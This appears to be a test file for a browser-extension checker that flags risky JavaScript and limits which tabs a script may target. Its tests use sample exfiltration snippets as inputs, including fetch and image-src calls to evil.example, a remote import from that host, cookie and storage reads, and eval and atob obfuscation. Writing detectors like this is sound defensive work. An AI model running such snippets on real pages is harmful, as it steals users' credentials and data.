import { describe, expect, it } from 'vitest';
import { scriptRiskWarnings, scriptTargetScope, urlOrigin } from './scriptRisk';

describe('scriptRiskWarnings', () => {
  it('returns nothing for a plain read of page state', () => {
    expect(scriptRiskWarnings('document.querySelectorAll("h2").length')).toEqual([]);
    expect(scriptRiskWarnings('window.map.setView([45.4, -75.7], 12)')).toEqual([]);
  });

  it('flags ways to send data out', () => {
    for (const code of [
      'fetch("https://evil.example/?d=" + x)',
      'new XMLHttpRequest()',
      'navigator.sendBeacon(u, d)',
      'new WebSocket(u)',
      'new Image().src = u',
      'img.src = "https://evil.example/" + x',
      'import("https://evil.example/m.js")',
    ]) {
      expect(scriptRiskWarnings(code), code).toContain('network');
    }
  });

  it('does not treat a src comparison as an assignment', () => {
    expect(scriptRiskWarnings('img.src == "a"')).not.toContain('network');
  });

  it('flags credential and storage reads', () => {
    expect(scriptRiskWarnings('document.cookie')).toContain('credentials');
    expect(scriptRiskWarnings('localStorage.getItem("token")')).toContain('credentials');
    expect(scriptRiskWarnings('Object.keys(sessionStorage)')).toContain('credentials');
  });

  it('flags navigation, form submits and cross-window messaging', () => {
    expect(scriptRiskWarnings('location.href = u')).toContain('navigation');
    expect(scriptRiskWarnings('location = u')).toContain('navigation');
    expect(scriptRiskWarnings('window.open(u)')).toContain('navigation');
    expect(scriptRiskWarnings('location.pathname === "/x"')).not.toContain('navigation');
    expect(scriptRiskWarnings('form.requestSubmit()')).toContain('form_submit');
    expect(scriptRiskWarnings('top.postMessage(x, "*")')).toContain('cross_window');
  });

  it('flags obfuscation that could hide the rest', () => {
    for (const code of [
      'eval(s)',
      'new Function(s)()',
      'atob("ZmV0Y2g=")',
      'String.fromCharCode(102, 101)',
      'window["\\x66etch"](u)',
      'window["fe" + "tch"](u)',
    ]) {
      expect(scriptRiskWarnings(code), code).toContain('dynamic_code');
    }
  });

  it('reports each kind once, in a stable order', () => {
    expect(scriptRiskWarnings('eval(document.cookie); fetch(u); fetch(v)')).toEqual([
      'network',
      'credentials',
      'dynamic_code',
    ]);
  });
});

describe('scriptTargetScope', () => {
  it('allows the active tab', () => {
    expect(scriptTargetScope({ id: 5, groupId: -1 }, 5, null)).toEqual({ ok: true, reason: 'active_tab' });
  });

  it("allows a tab in the conversation's group", () => {
    expect(scriptTargetScope({ id: 9, groupId: 3 }, 5, 3)).toEqual({ ok: true, reason: 'conversation_group' });
  });

  it('refuses any other tab', () => {
    expect(scriptTargetScope({ id: 9, groupId: 4 }, 5, 3).ok).toBe(false);
    expect(scriptTargetScope({ id: 9, groupId: -1 }, 5, null).ok).toBe(false);
  });

  it('never matches ungrouped tabs to an unset group', () => {
    expect(scriptTargetScope({ id: 9, groupId: -1 }, 5, -1).ok).toBe(false);
  });

  it('refuses when there is no active tab to compare with', () => {
    expect(scriptTargetScope({ id: 9 }, undefined, null).ok).toBe(false);
  });
});

describe('urlOrigin', () => {
  it('returns the origin of a web URL', () => {
    expect(urlOrigin('https://mail.example.com/inbox?x=1')).toBe('https://mail.example.com');
  });

  it('returns undefined for opaque or missing URLs', () => {
    expect(urlOrigin('about:blank')).toBeUndefined();
    expect(urlOrigin('data:text/html,hi')).toBeUndefined();
    expect(urlOrigin(undefined)).toBeUndefined();
    expect(urlOrigin('not a url')).toBeUndefined();
  });
});
